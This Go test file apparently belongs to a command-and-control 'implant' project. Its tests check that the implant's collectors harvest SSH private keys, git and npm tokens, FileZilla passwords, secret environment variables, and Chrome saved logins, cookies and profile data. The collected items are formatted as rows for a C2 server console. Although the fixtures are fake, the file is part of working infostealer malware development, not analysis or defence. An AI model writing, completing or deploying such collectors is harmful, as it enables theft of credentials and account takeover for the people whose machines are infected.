//go:build darwin || linux

package main

import (
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"c2-platform/internal/protocol"
)

// fixtureHome builds a throwaway HOME with the artifacts the collectors look
// for, so the collectors can be exercised without touching real user data.
func fixtureHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	write := func(rel, body string) {
		path := filepath.Join(home, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(".ssh/id_ed25519", "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEYMATERIAL\n-----END OPENSSH PRIVATE KEY-----\n")
	write(".git-credentials", "https://deploy:ghp_fixturetoken123456@git.example.com\n")
	write(".npmrc", "//registry.npmjs.org/:_authToken=npm_FAKE0123456789abcdef\n")
	write(".config/filezilla/recentservers.xml",
		"<FileZilla3><Servers><Server><Host>ftp.example.com</Host><Port>21</Port>"+
			"<User>ftpuser</User><Pass>Zml4dHVyZXBhc3M=</Pass></Server></Servers></FileZilla3>")
	t.Setenv("HOME", home)
	return home
}

// drainConn runs fn against a pipe and returns the decoded data frames.
func drainConn(t *testing.T, fn func(net.Conn)) []string {
	t.Helper()
	client, server := net.Pipe()
	done := make(chan struct{})
	go func() {
		defer close(done)
		fn(client)
		_ = client.Close()
	}()
	var lines []string
	for {
		f, err := protocol.Decode(server)
		if err != nil {
			break
		}
		if f.Type == protocol.RspData {
			lines = append(lines, strings.TrimRight(string(f.Payload), "\n"))
		}
		if f.Type == protocol.RspEnd {
			break
		}
	}
	_ = server.Close()
	<-done
	return lines
}

func TestCollectSystemCredsFixture(t *testing.T) {
	fixtureHome(t)
	lines := drainConn(t, collectSystemCreds)
	if len(lines) == 0 {
		t.Fatal("no rows emitted")
	}
	joined := strings.Join(lines, "\n")
	for _, want := range []string{
		"K\tSSHKey\tid_ed25519",
		"G\tGit\thttps://git.example.com\tdeploy\tghp_fixturetoken123456",
		"F\tFileZilla\tftp.example.com\tftpuser\tfixturepass",
		"X\t.npmrc",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing row %q in:\n%s", want, joined)
		}
	}
	// Every row must have exactly 7 tab-separated fields: the server parser
	// depends on the shape.
	for _, ln := range lines {
		if n := len(strings.Split(ln, "\t")); n != 7 {
			t.Errorf("row has %d fields: %q", n, ln)
		}
	}
	// SSH key material must be base64 (single line, no PEM newlines).
	for _, ln := range lines {
		if strings.HasPrefix(ln, "K\t") {
			f := strings.Split(ln, "\t")
			if strings.Contains(f[4], "BEGIN") || strings.Contains(f[4], "\n") {
				t.Errorf("ssh key not base64-encoded: %q", f[4])
			}
		}
	}
}

func TestEnvCollectorFiltersNoise(t *testing.T) {
	fixtureHome(t)
	t.Setenv("API_TOKEN", "super-secret-token-value")
	t.Setenv("PATH", "/usr/bin:/bin")
	t.Setenv("SOME_RANDOM_SETTING", "not-a-secret-at-all")
	lines := drainConn(t, collectSystemCreds)
	var envRows []string
	for _, ln := range lines {
		if strings.HasPrefix(ln, "E\t") {
			envRows = append(envRows, ln)
		}
	}
	if len(envRows) != 1 || !strings.Contains(envRows[0], "API_TOKEN") {
		t.Fatalf("env rows %v", envRows)
	}
	if strings.Contains(strings.Join(lines, "\n"), "PATH") {
		t.Fatal("PATH leaked into the report")
	}
}

// chromeProfileDir asks the implant itself where Chrome lives on this platform,
// so the fixture lands exactly where the collector looks (macOS and Linux
// disagree, and hardcoding one path made these tests fail on the other).
func chromeProfileDir(t *testing.T) (root, profile string) {
	t.Helper()
	for _, br := range browserRoots() {
		if br.name == "Chrome" && !br.firefox {
			return br.path, filepath.Join(br.path, "Default")
		}
	}
	t.Fatalf("no Chrome root reported by browserRoots()")
	return "", ""
}

// TestBrowserCollectorReadsFixtureProfile drives the Chromium path with a real
// SQLite file created by the sqlite3 CLI, and tolerates the missing keychain by
// reporting a note instead of dropping the row.
func TestBrowserCollectorReadsFixtureProfile(t *testing.T) {
	fixtureHome(t)
	prof, dir := chromeProfileDir(t)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	seedChromeStore(t, filepath.Join(dir, "Login Data"),
		`create table logins(origin_url text, username_value text, password_value blob, times_used int, date_created int);
insert into logins values('https://portal.example.com','alice@example.com', x'7631300011223344556677', 5, 13300000000000000);`)
	seedChromeStore(t, filepath.Join(dir, "Web Data"),
		`create table autofill(name text, value text);
insert into autofill values('email','alice@example.com');`)
	seedChromeStore(t, filepath.Join(dir, "Cookies"),
		`create table cookies(host_key text, name text, encrypted_value blob, expires_utc int);
insert into cookies values('.example.com','sid', x'763130AABBCCDDEEFF0011', 13300000000000000);`)
	if err := os.WriteFile(filepath.Join(dir, "Preferences"),
		[]byte(`{"profile":{"name":"Work","account_info":[{"email":"alice@example.com"}]}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(prof, "Local State"),
		[]byte(`{"os_crypt":{"encrypted_key":""}}`), 0o600); err != nil {
		t.Fatal(err)
	}

	lines := drainConn(t, collectBrowserCreds)
	joined := strings.Join(lines, "\n")
	for _, want := range []string{
		"C\tChrome\thttps://portal.example.com\talice@example.com",
		"A\tChrome\temail",
		"N\tChrome\t配置身份",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing row %q in:\n%s", want, joined)
		}
	}
	// Without keychain access the password cell stays empty and the note explains it.
	for _, ln := range lines {
		if strings.HasPrefix(ln, "C\t") {
			f := strings.Split(ln, "\t")
			if f[4] != "" && !strings.Contains(f[4], "•") {
				t.Errorf("password should be empty when undecryptable, got %q", f[4])
			}
			if !strings.Contains(f[5], "解密") && !strings.Contains(f[5], "无主密钥") {
				t.Errorf("missing decrypt note: %q", f[5])
			}
		}
	}
}

func seedChromeStore(t *testing.T, path, sql string) {
	t.Helper()
	bin, err := exec.LookPath("sqlite3")
	if err != nil {
		t.Skip("sqlite3 CLI not installed")
	}
	cmd := exec.Command(bin, path)
	cmd.Stdin = strings.NewReader(sql)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("seed %s: %v %s", filepath.Base(path), err, out)
	}
}

// TestBrowserInventoryEmitsConfigSummary guards the inventory's P/K rows: the
// console shows "配置摘要" from them, and an unwired helper would silently
// leave that table empty (which is exactly what happened once).
func TestBrowserInventoryEmitsConfigSummary(t *testing.T) {
	fixtureHome(t)
	root, prof := chromeProfileDir(t)
	if err := os.MkdirAll(prof, 0o755); err != nil {
		t.Fatal(err)
	}
	write := func(path, body string) {
		if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(filepath.Join(root, "Local State"), `{"os_crypt":{"encrypted_key":"RFBBUEkBAAAA"},
	  "profile":{"info_cache":{"Default":{"name":"Work","user_name":"alice@example.com"}}}}`)
	write(filepath.Join(prof, "Preferences"), `{"profile":{"name":"Work","account_info":[{"email":"alice@example.com"}]}}`)
	write(filepath.Join(prof, "History"), "") // present but empty: F rows only
	write(filepath.Join(root, "Last Version"), "141.0.7390.55")

	lines := drainConn(t, handleBrowser)
	joined := strings.Join(lines, "\n")
	for _, want := range []string{
		"K\tChrome\t-\tos_crypt\tv10 (可解密)",
		"K\tChrome\t-\tprofiles\t1",
		"P\tChrome\tDefault\t账户\talice@example.com",
		"P\tChrome\tDefault\t配置名\tWork",
		"V\tChrome\t-\t141.0.7390.55",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %q in inventory output:\n%s", want, joined)
		}
	}
}
